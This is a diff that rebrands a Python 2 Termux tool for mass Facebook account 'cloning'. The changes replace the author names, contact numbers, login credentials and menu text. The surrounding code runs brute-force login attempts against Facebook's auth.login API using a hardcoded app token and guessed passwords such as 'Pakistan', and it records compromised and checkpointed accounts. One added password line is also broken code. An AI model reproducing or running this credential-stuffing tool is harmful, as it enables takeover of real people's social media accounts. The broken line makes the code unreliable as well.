@@ -48,16 +48,15 @@ def jalan(z):
 
 #### LOGO ####
 logo = """
-\033[0;39m╭━━━┳━━━┳━━━╮
-\033[0;39m┃╭━╮┃╭━━┫╭━╮┃
-\033[0;39m╰╯╭╯┃╰━━┫┃┃┃┃
-\033[0;39m╭╮╰╮┃╭━╮┃┃┃┃┃
-\033[0;39m┃╰━╯┃╰━╯┃╰━╯┃
-\033[0;39m╰━━━┻━━━┻━━━╯
+
+\033[0;39m██╔══██╗██╔════╝██╔════╝╚══██╔══╝╚██╗░██╔╝
+\033[0;39m██████╦╝█████╗░░╚█████╗░░░░██║░░░░╚████╔╝░
+\033[0;39m██╔══██╗██╔══╝░░░╚═══██╗░░░██║░░░░░╚██╔╝░░
+\033[0;39m██████╦╝███████╗██████╔╝░░░██║░░░░░░██║░░░
+\033[0;39m╚═════╝░╚══════╝╚═════╝░░░░╚═╝░░░░░░╚═╝░░░
 \033[0;39m╔▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╗
-\033[0;39m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|RANA.AAHIL\033[0;31m║
-\033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[4mhttps://Github.com/Aahilzada\033[0m \033[0;31m║
-\033[0;39m║\033[0;36m* \033[0;32mWhatsApp \033[1;32m: \033[1;32m0308-7861-7861\033[0;31m║
+\033[0;39m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|SANA ULLAH\033[0;31m║
+\033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[4mhttps://Github.com/Sanaullah79\033[0m \033[0;31m║
 \033[0;34m╚▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╝"""
 
 def tik():
@@ -77,13 +76,13 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print "\x1b[0;31m⚔═══════════════════════════☠═══════════════════════════⚔"
-print  """\x1b[0;31m [¤] \x1b[0;31mASSALAM O ALAIKUM\x1b[0;31m  \033[1;96m   [¤] \x1b[0;31mWHATSAPP : 085691015635\x1b[1;96m  
+print  """\x1b[0;31m [¤] \x1b[0;31mASSALAM O ALAIKUM\x1b[0;31m  \033[1;96m   [¤] \x1b[0;31mWHATSAPP : 03189165390\x1b[1;96m  
 \033[1;93m [¤] \x1b[0;31mSTAY HOME\x1b[1;96m      [¤] \x1b[0;31mFACEBOOK : TERMUX TOOLS\x1b[1;96m  
-\033[1;93m [¤] \x1b[0;31mTOOLS BY AAHIL\x1b[1;96m  [¤] \x1b[0;31mYOUTUBE  : AAHIL CREATIONSs\x1b[0;31m"""
+\033[1;93m [¤] \x1b[0;31mTOOLS BY sanullah\x1b[1;96m  [¤] \x1b[0;31mYOUTUBE  : SANAULLAH BLACK MAFIA \x1b[0;31m"""
 print " \x1b[1;93m⚔══════════════════════════☠═══════════════════════════⚔"
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+CorrectUsername = "mafia"
+CorrectPassword = "mafia"
 
 loop = 'true'
 while (loop == 'true'):
@@ -177,23 +176,19 @@ def menu():
 		sub = str(b['summary']['total_count'])
 	except KeyError:
 		os.system('clear')
-		print"\033[1;91mYour Account is on Checkpoint"
+		print"\033[1;91mAPKA ACCOUNT CHECKPOINT PAR HAI"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
 	except requests.exceptions.ConnectionError:
-		print"\x1b[1;92mThere is no internet connection"
+		print"\x1b[1;92mAPKE PAS INTERNET CONNECTION NHI HAI"
 		keluar()
 	os.system("clear")
 	print logo
 	print "   \033[1;36;40m      ╔═════════════════════════════════╗"
 	print "   \033[1;36;40m      ║\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m║"                               
-	print "   \033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
-	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
-	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
-	print "\033[1;32;40m[1] \033[1;33;40m══Start Hack3ing"	
-	print "\033[1;32;40m[2] \033[1;33;40m══Update Aahil"																														
-	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
+	print "   \033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"																														
+	print "\033[1;32;40m[0] \033[1;33;40m══Log out KARE"
 	pilih()
 
 def pilih():
@@ -230,11 +225,11 @@ def super():
 		login()
 	os.system('clear')
 	print logo
-	print "\x1b[1;32;40m[1] \033[1;33;40m══Hack From Friend List"
-	print "\x1b[1;32;40m[2] \033[1;33;40m══Hack From Public ID"
+	print "\x1b[1;32;40m[1] \033[1;33;40m══APNE FRIENDLIST SE HACKK KARE"
+	print "\x1b[1;32;40m[2] \033[1;33;40m══PUBLIC FRIENDLIST HACK KARE"
 	print "\x1b[1;32;40m[3] \033[1;33;40m══Hack Bruteforce"
 	print "\x1b[1;32;40m[4] \033[1;33;40m══Hack From File"
-	print "\x1b[1;32;40m[0] \033[1;33;40m══Back"
+	print "\x1b[1;32;40m[0] \033[1;33;40m══Back TO SANAULLAH COMMANDS"
 	pilih_super()
 
 def pilih_super():
@@ -299,7 +294,7 @@ def pilih_super():
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
 	print "   \033[1;31;48m●💋════════════════════════◄►════════════════════════💋●"
 
-	jalan('                    \033[1;91mAahil start cloning Wait...')
+	jalan('                    \033[1;91mSanaullah start cloning Wait...')
 	print  "  \033[1;36;48m ●💋════════════════════════◄►════════════════════════💋●" 
 
 	def main(arg):
@@ -368,7 +363,7 @@ def pilih_super():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											pass5 = '786786'
+											pass5 = 'Pakistan'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -396,7 +391,7 @@ def pilih_super():
 															cek.close()
 															cekpoint.append(user+pass6)
 														else:
-															pass7 = 'Pakistan'
+															pass7 = ['last_name'] + 12345
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
